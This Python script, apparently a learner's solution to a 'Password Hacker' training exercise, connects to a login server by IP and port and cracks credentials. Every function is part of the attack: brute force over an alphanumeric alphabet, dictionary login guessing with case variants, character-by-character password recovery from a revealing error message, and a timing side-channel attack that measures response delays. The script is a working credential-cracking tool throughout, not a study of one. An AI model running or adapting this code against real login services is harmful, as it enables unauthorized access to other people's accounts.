import argparse
import socket
import itertools
import json
from time import perf_counter_ns

logins = 'C:\\Users\\natalcia\\PycharmProjects\\Password Hacker (Python)1\\Password Hacker (' \
         'Python)\\task\\hacking\\logins.txt'

# taking arguments from cmd
parser = argparse.ArgumentParser()

parser.add_argument("IP")
parser.add_argument("port", type=int)
# parser.add_argument("text")

args = parser.parse_args()

address = (args.IP, args.port)

# connecting to server
client_socket = socket.socket()
client_socket.connect(address)

# message = args.text.encode()
# client_socket.send(message)

# uwaga mikolajka hudko, zeby zrobic stringa zamiast tablicy bo czytelniejsze
symbols = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '0',
           'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o',
           'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']


# for i in range(97, 122):  # dodajemy litery po ascii
#     symbols.append(chr(i))
#
# for i in range(48, 58):  # dodajemy liczby po ascii
#     symbols.append(chr(i))


def tuplelist_to_str(tup_list):
    wrd_list = []
    for tup in tup_list:
        word = ""
        for char in tup:
            word = word + str(char)

        wrd_list.append(word)
    return wrd_list


def message_manage(text):
    message = text.encode()
    client_socket.send(message)

    response = client_socket.recv(1024)
    response = response.decode()

    return response


def brute_force(max_len):
    for rep in range(1, max_len + 1):

        password_list = list(itertools.product(symbols, repeat=rep))
        password_list = tuplelist_to_str(password_list)

        for password in password_list:
            response = message_manage(password)

            if response == "Connection success!":
                return password.strip()


def dict_based_bf(file, expected_response):
    with open(file) as wej:
        for line in wej:
            word = line.strip()
            password_list = list(itertools.product(*([letter.upper(), letter.lower()] for letter in word)))
            password_list = tuplelist_to_str(password_list)

            for password in password_list:
                response = message_manage(password)

                if response == expected_response:
                    return password.strip()


def dict_based_bf_json(file, expected_response, template):
    with open(file) as wej:
        for line in wej:
            word = line.strip()
            login_list = list(itertools.product(*([letter.upper(), letter.lower()] for letter in word)))
            login_list = tuplelist_to_str(login_list)

            for login in login_list:
                template["login"] = login
                message_json = json.dumps(template)

                response_json = message_manage(message_json)
                response = json.loads(response_json)

                if response["result"] == expected_response:
                    return login.strip()


def catching_exception(login_file):
    login = find_login(login_file)
    message = dict(login=" ", password="")
    message["login"] = login
    password = ""
    result = dict(result="")

    while result["result"] != "Connection success!":
        for sym in symbols:
            test_password = password + sym
            message["password"] = test_password
            result = json.loads(message_manage(json.dumps(message)))
            if result["result"] == "Exception happened during login" or result["result"] == "Connection success!":
                password = test_password
                break
        else:
            for sym in symbols[10:]:
                test_password = password + sym.upper()
                message["password"] = test_password
                result = json.loads(message_manage(json.dumps(message)))
                if result["result"] == "Exception happened during login" or result["result"] == "Connection success!":
                    password = test_password
                    break

    return json.dumps(message)


def find_login(login_file):
    message = dict(login=" ", password=" ")
    login = dict_based_bf_json(login_file, "Wrong password!", message)
    return login


def time_based_vulnerability(login_file):
    login = find_login(login_file)
    message = dict(login=" ", password="")
    message["login"] = login
    password = ""
    result = dict(result="")

    while result["result"] != "Connection success!":
        for sym in symbols:
            test_password = password + sym
            message["password"] = test_password
            start = perf_counter_ns()
            result = json.loads(message_manage(json.dumps(message)))
            end = perf_counter_ns()
            if end - start >= 1100000 or result["result"] == "Connection success!":
                password = test_password
                break
        else:
            for sym in symbols[10:]:
                test_password = password + sym.upper()
                message["password"] = test_password
                start = perf_counter_ns()
                result = json.loads(message_manage(json.dumps(message)))
                end = perf_counter_ns()
                if end - start >= 1100000 or result["result"] == "Connection success!":
                    password = test_password
                    break
            else:
                result["result"] = "Connection success!"

    return json.dumps(message)


print(time_based_vulnerability(logins))
client_socket.close()
